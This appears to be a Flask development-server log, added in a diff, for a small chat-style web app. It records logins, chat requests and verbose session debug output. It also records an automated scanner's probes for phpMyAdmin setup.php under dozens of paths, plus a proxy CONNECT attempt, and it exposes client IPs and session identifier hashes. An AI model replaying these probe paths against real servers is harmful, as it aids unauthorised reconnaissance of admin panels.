+220.122.91.84 - - [19/Sep/2024 16:59:15] "[33mGET http://121.37.244.30:8080/myadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:15] "[33mGET http://121.37.244.30:8080/MyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:16] "[33mGET http://121.37.244.30:8080/PHPMYADMIN/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:16] "[33mGET http://121.37.244.30:8080/mysqladmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:16] "[33mGET http://121.37.244.30:8080/SQL/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:17] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:17] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:17] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0[0m" 404 -
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98444f50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98488990>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98489cd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98489710>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846e990>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847a210>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846f010>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846e250>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98479950>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984793d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98479150>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848cb90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848cc90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f550>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848fb90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f410>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848ffd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848e210>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848ce50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848efd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984469d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445c10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848c1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846e650>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846f810>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848ae90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846f290>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446d10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98457550>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848e290>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848e1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d6d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d8d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848c1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98489490>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98dcdb90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445c10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846c210>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848a410>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848a910>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+220.122.91.84 - - [19/Sep/2024 16:59:17] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:17] "[33mGET http://121.37.244.30:8080/admin/pma/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/web/phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/webadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/admin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/dbadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:18] "[33mGET http://121.37.244.30:8080/mysql/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:19] "[33mGET http://121.37.244.30:8080/phpMyAdmin2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:19] "[33mGET http://121.37.244.30:8080/phpma/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:19] "[33mGET http://121.37.244.30:8080/sqlweb/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:20] "[33mGET http://121.37.244.30:8080/webdb/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:20] "[33mGET http://121.37.244.30:8080/websql/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:20] "[33mGET http://121.37.244.30:8080/_phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:21] "[33mGET http://121.37.244.30:8080/php/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:21] "[33mGET http://121.37.244.30:8080/admin/phpmyadmin/scripts/setup.txt HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:21] "[33mGET http://121.37.244.30:8080/db/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:22] "[33mGET http://121.37.244.30:8080/sqlmanager/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:23] "[33mGET http://121.37.244.30:8080/mysqlmanager/scripts/setup.php HTTP/1.0[0m" 404 -
+111.55.166.5 - - [19/Sep/2024 16:59:50] "[32mGET / HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 16:59:51] "GET /login?next=/ HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:59:51] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:59:51] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+111.55.166.5 - - [19/Sep/2024 17:00:03] "[32mGET / HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 17:00:03] "GET /login?next=/ HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:03] "GET /static/css/auth.css HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:03] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "[32mPOST /login?next=/ HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET / HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/css/style.css HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/js/script.js HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/uploads/user.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/svg/clear.svg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/js/script.js HTTP/1.1" 200 -
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98488810>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98439a10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848ccd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d6d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d050>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848e6d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848ebd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848e0d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848b350>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98489690>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846f190>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98de1ad0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446050>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98438350>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98479d50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98439a10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846c490>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848bd50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446cd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847ba10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848bb10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847ad50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98492ad0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98491210>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98492190>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98492150>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984458d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.318565+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.451729+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.452757+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.455057+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.545745+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.796217+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /static/uploads/system.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:10] "GET /get_history HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:11] "GET /static/svg/delete.svg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:18] "GET /get_conversation/4 HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:18] "POST /log_click HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:18] "GET /static/svg/delete.svg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:18] "GET /static/uploads/system.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:18] "GET /static/uploads/user.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:20] "[36mGET /static/svg/delete.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 17:00:20] "POST /log_click HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:24] "POST /log_click HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:24] "GET /static/uploads/user.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:24] "POST /ask HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:25] "GET /static/uploads/system.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:25] "GET /get_history HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:25] "GET /static/svg/delete.svg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:28] "GET /static/uploads/system.jpg HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 17:00:28] "POST /log_click HTTP/1.1" 200 -
+154.213.187.241 - - [19/Sep/2024 17:00:34] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+27.115.124.38 - - [19/Sep/2024 17:03:59] "[32mGET / HTTP/1.1[0m" 302 -
+27.115.124.118 - - [19/Sep/2024 17:03:59] "[32mGET / HTTP/1.1[0m" 302 -
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.884840+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:10.888167+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:11.040515+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:18.547175+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:18.552873+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:18.653775+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:18.655734+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:18.656731+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:20.147008+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:20.151311+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:24.898889+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:24.899289+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:24.901928+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:25.018982+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:25.020903+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:25.118389+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:28.919060+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
